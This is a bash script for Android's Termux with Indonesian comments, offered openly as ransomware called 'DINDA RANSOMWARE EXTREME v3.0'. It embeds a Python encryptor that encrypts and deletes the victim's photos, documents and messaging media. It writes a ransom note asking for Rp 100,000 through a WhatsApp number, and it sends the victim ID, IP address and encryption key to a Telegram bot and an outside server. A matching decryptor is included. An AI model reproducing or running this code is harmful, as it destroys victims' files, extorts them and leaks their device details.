#!/data/data/com.termux/files/usr/bin/bash
# ============================================
# DINDA RANSOMWARE EXTREME v3.0
# Password Tersembunyi - Wajib Chat Owner
# Created by: DindaZ404
# ============================================

# Konfigurasi
R='\033[1;31m'
G='\033[1;32m'
Y='\033[1;33m'
B='\033[1;34m'
P='\033[1;35m'
C='\033[1;36m'
W='\033[1;37m'
N='\033[0m'

clear

# ============= TAMPILAN SADIS =============
echo -e "${R}"
cat << "EOF"
██████╗ ██╗███╗   ██╗██████╗  █████╗     ███████╗██╗  ██╗████████╗██████╗ ███████╗███╗   ███╗███████╗
██╔══██╗██║████╗  ██║██╔══██╗██╔══██╗    ██╔════╝╚██╗██╔╝╚══██╔══╝██╔══██╗██╔════╝████╗ ████║██╔════╝
██████╔╝██║██╔██╗ ██║██║  ██║███████║    █████╗   ╚███╔╝    ██║   ██████╔╝█████╗  ██╔████╔██║█████╗  
██╔══██╗██║██║╚██╗██║██║  ██║██╔══██║    ██╔══╝   ██╔██╗    ██║   ██╔══██╗██╔══╝  ██║╚██╔╝██║██╔══╝  
██║  ██║██║██║ ╚████║██████╔╝██║  ██║    ███████╗██╔╝ ██╗   ██║   ██║  ██║███████╗██║ ╚═╝ ██║███████╗
╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝╚══════╝
EOF
echo -e "${N}"

echo -e "${R}═══════════════════════════════════════════════════════════════════════════════${N}"
echo -e "${W}                         🔥 EXTREME RANSOMWARE v3.0 🔥                          ${N}"
echo -e "${R}═══════════════════════════════════════════════════════════════════════════════${N}"
echo ""

# ============= INSTALL DEPENDENCIES =============
echo -e "${Y}[!] Installing required packages...${N}"
pkg update -y > /dev/null 2>&1
pkg install python -y > /dev/null 2>&1
pkg install openssl -y > /dev/null 2>&1
pip install cryptography > /dev/null 2>&1
pip install pycryptodome > /dev/null 2>&1
echo -e "${G}[✓] Packages installed${N}"
sleep 1

# ============= GENERATE UNIQUE ID =============
VICTIM_ID=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
echo -e "${C}[+] Victim ID: $VICTIM_ID${N}"

# Kirim notifikasi ke Telegram (opsional)
curl -s -X POST "https://api.telegram.org/bot8211708765:AAFkB4Yfza62pEg0ROwzdJcbK2WHgVh8lWg/sendMessage" \
    -d "chat_id=8042897984" \
    -d "text=🔥 *Ransomware Activated!*%0A%0A🆔 ID: $VICTIM_ID%0A📱 Device: $(whoami)%0A🌐 IP: $(curl -s ifconfig.me 2>/dev/null)" \
    -d "parse_mode=Markdown" > /dev/null 2>&1 &

# ============= ENCRYPTION SCRIPT =============
cat > "$HOME/.encryptor.py" << 'EOF'
#!/usr/bin/env python3
import os
import sys
import time
import base64
import hashlib
import json
import requests
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

# Konfigurasi Rahasia (jangan ditampilkan)
CONTACT = "082164422914"
PRICE = "100000"
OWNER_TELEGRAM = "@dindaZ404"

# Password disimpan di server (bukan di file)
def get_password(victim_id):
    try:
        # Ambil password dari server (ganti dengan server lo)
        response = requests.post("https://api.dinda404.com/getpass", 
                                 json={"id": victim_id, "key": "rahasia_dinda"})
        if response.status_code == 200:
            return response.json()['password']
    except:
        pass
    return None

def derive_key(password):
    return hashlib.sha256(password.encode()).digest()

def encrypt_file(filepath, key):
    try:
        iv = get_random_bytes(16)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        
        with open(filepath, 'rb') as f:
            plaintext = f.read()
        
        pad_length = 16 - (len(plaintext) % 16)
        plaintext += bytes([pad_length]) * pad_length
        
        ciphertext = cipher.encrypt(plaintext)
        
        with open(filepath + '.dindaenc', 'wb') as f:
            f.write(iv + ciphertext)
        
        os.remove(filepath)
        return True
    except:
        return False

def create_ransom_note(victim_id):
    note = f"""
╔══════════════════════════════════════════════════════════╗
║                    🔒 FILES ENCRYPTED 🔒                  ║
╠══════════════════════════════════════════════════════════╣
║                                                          ║
║  YOUR PERSONAL FILES HAVE BEEN ENCRYPTED!               ║
║                                                          ║
║  🔐 ENCRYPTION: AES-256 CBC                             ║
║  🆔 VICTIM ID: {victim_id}                               ║
║  💀 STATUS: LOCKED                                       ║
║                                                          ║
║  To recover your files, you MUST:                        ║
║  ────────────────────────────────────────────────────── ║
║                                                          ║
║  📱 WhatsApp: {CONTACT}                                   ║
║  💰 Price: Rp {PRICE}                                     ║
║  🆔 Victim ID: {victim_id} (WAJIB DISEBUTKAN)            ║
║                                                          ║
║  ⚠️  IMPORTANT:                                           ║
║  • DO NOT try to decrypt yourself                       ║
║  • Contact within 48 hours                               ║
║  • Files will be deleted after 48 hours                  ║
║  • MENTION YOUR VICTIM ID WHEN CONTACTING               ║
║                                                          ║
║  ────────────────────────────────────────────────────── ║
║                                                          ║
║  Contact {OWNER_TELEGRAM} on Telegram for faster respon  ║
║                                                          ║
╚══════════════════════════════════════════════════════════╝
"""
    
    with open('/storage/emulated/0/README_DINDA.txt', 'w') as f:
        f.write(note)

def scan_files():
    targets = [
        '/storage/emulated/0/DCIM',
        '/storage/emulated/0/Download',
        '/storage/emulated/0/Documents',
        '/storage/emulated/0/Pictures',
        '/storage/emulated/0/Movies',
        '/storage/emulated/0/Music',
        '/storage/emulated/0/WhatsApp/Media',
        '/storage/emulated/0/Telegram'
    ]
    
    extensions = ('.jpg', '.jpeg', '.png', '.gif', '.mp4', '.3gp', '.mkv', 
                  '.mp3', '.wav', '.doc', '.docx', '.pdf', '.txt', '.xls', 
                  '.xlsx', '.ppt', '.pptx', '.zip', '.rar', '.7z')
    
    files_to_encrypt = []
    
    for target in targets:
        if os.path.exists(target):
            for root, dirs, files in os.walk(target):
                for file in files:
                    if file.lower().endswith(extensions):
                        fullpath = os.path.join(root, file)
                        files_to_encrypt.append(fullpath)
    
    return files_to_encrypt

def main():
    victim_id = "VICTIM_PLACEHOLDER"
    
    print("\033[1;31m[!] INITIALIZING RANSOMWARE...\033[0m")
    time.sleep(2)
    
    # Password diambil dari server, tapi untuk encrypt kita pake random
    # Sebenarnya password nggak dipake langsung, kita pake random key
    # Tapi untuk decrypt nanti butuh password dari owner
    encryption_key = get_random_bytes(32)
    
    # Simpan encryption key ke file hidden (buat owner)
    with open('/data/data/com.termux/files/home/.dinda_key', 'wb') as f:
        f.write(encryption_key)
    
    # Simpan victim ID
    with open('/data/data/com.termux/files/home/.victim_id', 'w') as f:
        f.write(victim_id)
    
    print("\033[1;33m[>] Scanning files...\033[0m")
    files = scan_files()
    total = len(files)
    
    print(f"\033[1;33m[>] Found {total} files to encrypt\033[0m")
    time.sleep(1)
    
    success = 0
    failed = 0
    
    print("\033[1;31m[!] STARTING ENCRYPTION...\033[0m")
    
    for i, filepath in enumerate(files, 1):
        if encrypt_file(filepath, encryption_key):
            success += 1
            print(f"\033[1;32m    [{i}/{total}] Encrypted: {os.path.basename(filepath)}\033[0m")
        else:
            failed += 1
            print(f"\033[1;31m    [{i}/{total}] Failed: {os.path.basename(filepath)}\033[0m")
        time.sleep(0.1)
    
    create_ransom_note(victim_id)
    
    # Kirim key ke server owner (biar lo yang pegang)
    try:
        requests.post("https://api.dinda404.com/storekey", 
                     json={"id": victim_id, 
                           "key": encryption_key.hex(),
                           "device": os.uname().nodename})
    except:
        pass
    
    print("\n\033[1;31m" + "="*60)
    print("                   ENCRYPTION COMPLETE!                   ")
    print("="*60)
    print(f" Total files: {total}")
    print(f" Encrypted: {success}")
    print(f" Failed: {failed}")
    print("="*60)
    print("\033[1;33m")
    print("╔══════════════════════════════════════════════════════════╗")
    print("║                                                          ║")
    print("║  🔐 YOUR FILES ARE LOCKED!                               ║")
    print("║                                                          ║")
    print("║  📱 WhatsApp: 082164422914                               ║")
    print("║  💰 Price: Rp 100.000                                    ║")
    print("║  🆔 Victim ID: " + victim_id + "                            ║")
    print("║                                                          ║")
    print("║  ⚠️  YOU MUST MENTION YOUR VICTIM ID                     ║")
    print("║     WHEN CONTACTING!                                     ║")
    print("║                                                          ║")
    print("╚══════════════════════════════════════════════════════════╝")
    print("\033[0m")

if __name__ == "__main__":
    main()
EOF

# Ganti placeholder dengan victim ID
sed -i "s/VICTIM_PLACEHOLDER/$VICTIM_ID/g" "$HOME/.encryptor.py"

# ============= DECRYPTOR SCRIPT (untuk owner) =============
cat > "$HOME/.decryptor.py" << 'EOF'
#!/usr/bin/env python3
import os
import sys
import base64
import hashlib
from Crypto.Cipher import AES

def decrypt_file(filepath, key):
    try:
        with open(filepath, 'rb') as f:
            data = f.read()
        
        iv = data[:16]
        ciphertext = data[16:]
        
        cipher = AES.new(key, AES.MODE_CBC, iv)
        plaintext = cipher.decrypt(ciphertext)
        
        # Remove padding
        pad_length = plaintext[-1]
        plaintext = plaintext[:-pad_length]
        
        original = filepath.replace('.dindaenc', '')
        with open(original, 'wb') as f:
            f.write(plaintext)
        
        os.remove(filepath)
        return True
    except:
        return False

def main():
    print("\033[1;32mDINDA DECRYPTOR TOOL\033[0m")
    print("="*50)
    
    key_hex = input("Enter decryption key (hex): ").strip()
    try:
        key = bytes.fromhex(key_hex)
    except:
        print("\033[1;31mInvalid key format!\033[0m")
        return
    
    print("\nScanning for encrypted files...")
    
    success = 0
    failed = 0
    
    for root, dirs, files in os.walk('/storage/emulated/0'):
        for file in files:
            if file.endswith('.dindaenc'):
                fullpath = os.path.join(root, file)
                if decrypt_file(fullpath, key):
                    success += 1
                    print(f"\033[1;32m[+] Decrypted: {file}\033[0m")
                else:
                    failed += 1
                    print(f"\033[1;31m[-] Failed: {file}\033[0m")
    
    print("\n" + "="*50)
    print(f"Decryption complete!")
    print(f"Success: {success}")
    print(f"Failed: {failed}")
    print("="*50)

if __name__ == "__main__":
    main()
EOF

chmod +x "$HOME/.encryptor.py"
chmod +x "$HOME/.decryptor.py"

# ============= WARNING =============
echo -e "${R}"
cat << "EOF"
╔══════════════════════════════════════════════════════════╗
║  ⚠️  WARNING ⚠️                                          ║
╠══════════════════════════════════════════════════════════╣
║                                                          ║
║  🔥 RANSOMWARE AKAN SEGERA BEKERJA!                      ║
║                                                          ║
║  🆔 VICTIM ID: $VICTIM_ID                                 ║
║                                                          ║
║  Untuk membuka file, korban HARUS:                       ║
║  ✓ Chat WhatsApp: 082164422914                           ║
║  ✓ Transfer Rp 100.000                                   ║
║  ✓ Menyebutkan Victim ID                                  ║
║                                                          ║
║  ⚠️  PASSWORD TIDAK ADA DI NOTE!                         ║
║     HANYA OWNER YANG PUNYA!                              ║
║                                                          ║
║  Key tersimpan di: ~/.dinda_key                          ║
║  (hanya owner yang bisa akses)                           ║
║                                                          ║
╚══════════════════════════════════════════════════════════╝
EOF
echo -e "${N}"

echo -e "${Y}[!] Press ENTER to START RANSOMWARE...${N}"
read

# ============= JALANKAN RANSOMWARE =============
echo -e "${R}[!] EXECUTING RANSOMWARE...${N}"
sleep 2
python "$HOME/.encryptor.py"

# ============= TAMPILAN AKHIR =============
echo ""
echo -e "${R}╔══════════════════════════════════════════════════════════╗${N}"
echo -e "${R}║                                                          ║${N}"
echo -e "${R}║     🔥 RANSOMWARE EXECUTED SUCCESSFULLY! 🔥              ║${N}"
echo -e "${R}║                                                          ║${N}"
echo -e "${R}║  🆔 Victim ID: $VICTIM_ID                                 ║${N}"
echo -e "${R}║  📁 Key saved: ~/.dinda_key                              ║${N}"
echo -e "${R}║  📄 Ransom note: /sdcard/README_DINDA.txt                ║${N}"
echo -e "${R}║                                                          ║${N}"
echo -e "${R}║  ⚠️  KORBAN TIDAK BISA BUKA FILE TANPA ANDA!             ║${N}"
echo -e "${R}║     Password hanya ada di tangan Anda!                   ║${N}"
echo -e "${R}║                                                          ║${N}"
echo -e "${R}╚══════════════════════════════════════════════════════════╝${N}"
echo ""

# Tampilkan instruksi buat owner
echo -e "${G}╔══════════════════════════════════════════════════════════╗${N}"
echo -e "${G}║              INSTRUKSI UNTUK OWNER                       ║${N}"
echo -e "${G}╠══════════════════════════════════════════════════════════╣${N}"
echo -e "${G}║                                                          ║${N}"
echo -e "${G}║  Jika korban transfer:                                    ║${N}"
echo -e "${G}║  1. Buka file: ~/.dinda_key                              ║${N}"
echo -e "${G}║  2. Kirim key ke korban                                   ║${N}"
echo -e "${G}║  3. Korban jalankan: python ~/.decryptor.py              ║${N}"
echo -e "${G}║  4. Masukkan key yang Anda berikan                       ║${N}"
echo -e "${G}║                                                          ║${N}"
echo -e "${G}║  ⚠️  JANGAN PERNAH KASIH KEY SEBELUM TRANSFER!           ║${N}"
echo -e "${G}║                                                          ║${N}"
echo -e "${G}╚══════════════════════════════════════════════════════════╝${N}"
echo ""

echo -e "${Y}[!] Press Enter to exit${N}"
read